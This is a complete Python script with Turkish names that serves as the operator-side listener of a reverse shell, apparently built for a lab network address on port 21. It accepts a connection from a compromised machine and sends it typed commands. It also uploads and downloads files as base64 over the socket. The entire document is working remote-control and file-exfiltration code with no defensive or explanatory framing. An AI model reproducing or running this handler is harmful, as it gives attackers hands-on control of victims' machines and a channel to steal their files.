import socket
import simplejson
import base64
class baglama:
    def __init__(self,ip,port):
        self.baglanti = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
        self.baglanti.setsockopt(socket.SOL_SOCKET,socket.SO_REUSEADDR,1)

        self.baglanti.bind((ip,port))
        self.baglanti.listen(5)
        print("Dinlemeye Başladı!")

        self.baglan,adres= self.baglanti.accept()
        print("Bağlandı!"+str(adres))

    def paketleme(self,veri):
        paket = simplejson.dumps(veri)
        self.baglan.sendall(paket.encode("utf-8"))
        if veri[0]=="çıkış":
            self.baglanti.close()
            exit()

    def paket_coz(self):
        gelen_veri = ""
        while True:
            try:
                gelen_veri = gelen_veri + self.baglan.recv(1024).decode("utf-8")
                return simplejson.loads(gelen_veri)
            except ValueError:
                continue

    def baslatma(self):
        while True:
            giris = input("Komut Gir : ")
            giris = giris.split(" ")
            try:
                if giris[0]=="yükle":
                    with open(giris[1],"rb") as dosya1:
                        veri3 = base64.b64encode(dosya1.read())
                        giris.append(veri3)
                self.paketleme(giris)
                cikti = self.paket_coz()
                if giris[0]=="indir" and "Hata!" not in cikti:
                    with open(giris[1],"wb") as dosya:
                        dosya.write(base64.b64decode(cikti))
                    cikti = giris[1] + " İndirildi!"
            except Exception:
                cikti = "Hata!"
            print(cikti)

baglanti_kurma = baglama("10.0.2.16",21)
baglanti_kurma.baslatma()